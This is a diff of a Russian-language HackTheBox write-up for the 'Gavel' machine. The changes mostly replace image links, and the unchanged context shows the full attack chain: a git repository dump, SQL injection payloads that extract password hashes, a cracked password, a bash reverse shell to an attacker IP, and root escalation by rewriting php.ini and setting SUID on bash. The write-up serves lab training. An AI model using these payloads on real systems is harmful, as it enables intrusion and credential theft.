@@ -12,7 +12,7 @@ ports=$(nmap -Pn -n --open --min-rate=1000 $IP -p- | grep ^[0-9] | cut -d '/' -f
 sudo nmap -sV -sC $IP -p "$ports" -oN discovery/services
 ```
 
-![[Pasted image 20260606130757.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606130757.png)
 
 Сканер показал два отрытых порта. 
 - `22/tcp` - `OpenSSH 8.9p1`
@@ -30,11 +30,11 @@ echo "10.129.242.203 gavel.htb" | sudo tee -a /etc/hosts
 sudo nmap -sV -sC gavel.htb -p80 -oN discovery/http
 ```
 
-![[Pasted image 20260606131016.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606131016.png)
 
 Сканер показал доступный git-репозиторий.  При посещении `http://gavel.htb/.git/`, мы видим индексируемую директорию.
 
-![[Pasted image 20260606131138.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606131138.png)
 
 Воспользуемся утилитой [git-dumper](https://github.com/arthaud/git-dumper) для выгрузки репозитория.
 
@@ -44,21 +44,21 @@ mkdir source
 git-dumper http://gavel.htb/.git source
 ```
 
-![[Pasted image 20260606131642.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606131642.png)
 
 Теперь мы имеем доступ к сурсу.
 
-![[Pasted image 20260606131826.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606131826.png)
 
 Посмотрим на сайт. По описанию на главной странице это сайт-аукцион.
 
-![[Pasted image 20260606132020.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606132020.png)
 
 Зарегистрируем аккаунт и войдем под учетной записью. Нам доступны функции просмотра инвентаря и сам аукцион.
 
-![[Pasted image 20260606132347.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606132347.png)
 
-![[Pasted image 20260606132401.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606132401.png)
 
 ## SQL Injection
 
@@ -70,7 +70,7 @@ opengrep scan -f /opt/semgrep-rules/php/ source/
 
 Сканер показал возможную SQL-инъекцию в файле `inventory.php`. В нем параметр пользовательского запроса попадает в запрос к базе данных.
 
-![[Pasted image 20260606132926.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606132926.png)
 
 Уязвимый фрагмент выглядит следующим образом.
 
@@ -123,7 +123,7 @@ SELECT `\'x` FROM (SELECT version() AS `\'x`)y;
 user_id=x`+FROM+(SELECT+version()+AS+`'x`)y;&sort=\?;--+-%00
 ```
 
-![[Pasted image 20260606135912.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606135912.png)
 
 Вытаскиваем всех пользователей из базы данных.
 
@@ -131,7 +131,7 @@ user_id=x`+FROM+(SELECT+version()+AS+`'x`)y;&sort=\?;--+-%00
 user_id=x`+FROM+(SELECT+CONCAT(username,0x7e,password)+AS+`'x`+FROM+users)y;&sort=\?;--+-%00
 ```
 
-![[Pasted image 20260606141406.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606141406.png)
 
 В ответе видим логин пользователя и bcrypt-хеш пароля.
 
@@ -145,7 +145,7 @@ auctioneer~$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
 hashcat -m 3200 -a 0 auctioneer.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260606144556.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606144556.png)
 
 Теперь у нас есть еще одна учетная запись.
 
@@ -157,7 +157,7 @@ auctioneer:midnight1
 
 Входим под полученными кредами и видим доступ к админ-панели, в которой мы можем редактировать правила для лотов.
 
-![[Pasted image 20260606144725.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606144725.png)
 
 Посмотрим на то, как работают лоты. В `bid_handler.php` мы видим использование функции `runkit_function_add`, которая позволяет динамически добавлять новые функции во время выполнения кода.
 
@@ -212,7 +212,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.123/9001 0>&1'");
 ```
 
-![[Pasted image 20260606205412.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606205412.png)
 
 Запустим слушатель.
 
@@ -222,7 +222,7 @@ nc -lvnp 9001
 
 И сделаем новую ставку. Получаем бэкконект от `www-data`.
 
-![[Pasted image 20260606205438.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606205438.png)
 
 ## Privilege Escalation
 
@@ -243,7 +243,7 @@ stty raw -echo;fg
 find / -group gavel-seller 2>/dev/null
 ```
 
-![[Pasted image 20260606225002.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606225002.png)
 
 В выводе видим два интересных файла: 
 
@@ -254,14 +254,14 @@ find / -group gavel-seller 2>/dev/null
 
 `gavel-util` позволяет отправить YAML-конфиг, показать статус аукциона и проголосовать.
 
-![[Pasted image 20260606225151.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606225151.png)
 
 В списке процессов видим работу демона `gaveld`. 
 ```bash
 ps auxf | grep -E '(gavel|gaveld)'
 ```
 
-![[Pasted image 20260606225248.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606225248.png)
 
 В директории с демоном мы видим `sample.yaml` содержащий пример конфигурации. Судя по параметру `rule` он тоже работает через PHP runkit.
 
@@ -306,7 +306,7 @@ rule_msg: "This is rule msg"
 rule: "file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On' . chr(10) . 'open_basedir=/' . chr(10) . 'memory_limit=32M' . chr(10) . 'max_execution_time=3' . chr(10) . 'max_input_time=10' . chr(10) . 'disable_functions='); return True;"
 ```
 
-![[Pasted image 20260606221505.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606221505.png)
 
 Теперь мы можем использовать `system()` в конфигурации для присвоения SUID-бита `/bin/bash`.
 
@@ -316,7 +316,7 @@ rule: "system('chmod u+s /bin/bash'); return True;"
 
 Запускаем `bash` с наивысшими привилегиями и получаем root-сессию. Машина пройдена!
 
-![[Pasted image 20260606221953.png]]
+![a](https://github.com/zhabii/htb-writeups/blob/main/media/Gavel/Pasted%20image%2020260606221953.png)
 
 ---
 #web #linux #pentest #writeup 
